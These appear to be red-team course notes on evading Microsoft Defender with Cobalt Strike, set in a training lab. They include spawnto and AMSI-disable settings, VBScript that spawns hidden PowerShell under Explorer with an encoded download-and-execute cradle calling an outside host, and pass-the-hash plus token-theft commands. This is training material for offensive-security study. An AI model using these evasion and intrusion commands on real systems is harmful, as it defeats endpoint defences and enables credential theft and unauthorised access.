# MS Defender (part 2)

## Behavioural Detections

When dealing with behavioural detections, the Defender alerts contain:

    Resources                      : {behavior:_pid:4964...

The Beacon on the file server runs inside the rundll32 process. When CS runs a post-ex command that uses the [fork & run](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm) pattern, it:

1. Spawns a sacrificial process (rundll32 by default -- now a common point of detection)
2. Injects the post-ex capability into it
3. Retrieves the output over a named pipe
4. Kills the process

Main reason is so that unstable post-ex tools don't crash the Beacon.

The service binary payload used by psexec also uses rundll32 by default, which is why Beacons run as rundll32.exe. The process used for post-ex commands and psexec can be changed on the fly in the CS GUI; use the spawnto command. x86 and x64 must be specified individually and environment variables can also be used.

    beacon> spawnto x64 %windir%\sysnative\dllhost.exe
    beacon> spawnto x86 %windir%\syswow64\dllhost.exe

Use the sysnative and syswow64 paths -- not system32. Using powerpick to get its own process name, it returns dllhost.

    beacon> powerpick Get-Process -Id $pid | select ProcessName
    ProcessName
    -----------
    dllhost    

powerpick + PowerView run on the file server without being caught by AMSI or behavioural detection:

    beacon> run hostname
    fs
    beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
    beacon> powerpick Get-Domain

Use the ```spawnto``` command without any argument to reset back to default.

Set this inside malleable C2 with the spawnto_x64 or spawnto_x86 directives inside the post-ex block. New Beacons use this as their new default:

    post-ex {
            set amsi_disable "true";
            set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
            set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    }

When moving laterally with psexec, Beacon attempts to use the setting from your malleable C2 profile. However, it cannot use environment variables (such as %windir%), so will fall back to rundll32. Override this at runtime with ak-settings to specify an absolute path instead:

    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
    beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

Can also change the name of the service (rather than 7 random characters) with ```ak-settings service <name>```. Lateral movement with psexec will then land us in dllhost.exe.

## Parent/Child Relationships

A subset of behavioural detections come from the parent/child relationships of running processes. A process only has one parent but can have many children. Applications such as [Process Hacker](https://processhacker.sourceforge.io) show these relationships. Most user apps run as children of Explorer. Many parent/child relationships are considered highly suspicious or outright malicious; e.g. our initial access payload. Since we executed a PowerShell one-liner via an Office macro, the instance of powershell.exe becomes a child of winword.exe. Defender blocks such things because Word spawning PS is a well-known phishing tactic.

One workaround is to execute PS without it becoming a child of Word. A simple way is with COM. Like COM objects in the DCOM lateral movement module, COM can be used for local execution. Both ShellWindows and ShellBrowserWindow spawn processes under Explorer. A simple example of spawning a hidden PS process using ShellWindows:

    Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    Set obj = shellWindows.Item()
    obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0

The arguments for ShellExecute are [documented](https://learn.microsoft.com/en-gb/windows/win32/shell/shell-shellexecute).

A weaponized example:

    Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    Set obj = shellWindows.Item()
    obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0

## Command Line Detections

Defender can also inspect the command line arguments of a process and prevent it from starting if it has malicious content, e.g. the built-in pth command:

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

The console log shows that this expands to:

    sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:"%COMSPEC% /c echo 9c91bb58485 > \\.\pipe\34a65a"

This gets an access denied error when Mimikatz tries to call CreateProcessWithLogonW. The "CmdLine" prefix gives away the origin of the detection. In this case, it's the ```echo x > \\.\pipe\``` pattern, which is synonymous with named pipe impersonation. Enforcement is by the Windows Defender driver in the kernel. This driver gets notified when new processes which contain a PS_CREATE_NOTIFY_INFO structure are created. 

Bypassing or disabling kernel-level callbacks is out of scope for RTO. A workaround is not use the same command line arguments. For pass-the-hash, start an arbitrary process and steal its token manually:

    beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
    beacon> steal_token 17896    //PID
    [+] Impersonated DEV\bfarmer
    beacon> ls \\web.dev.cyberbotic.io\c$


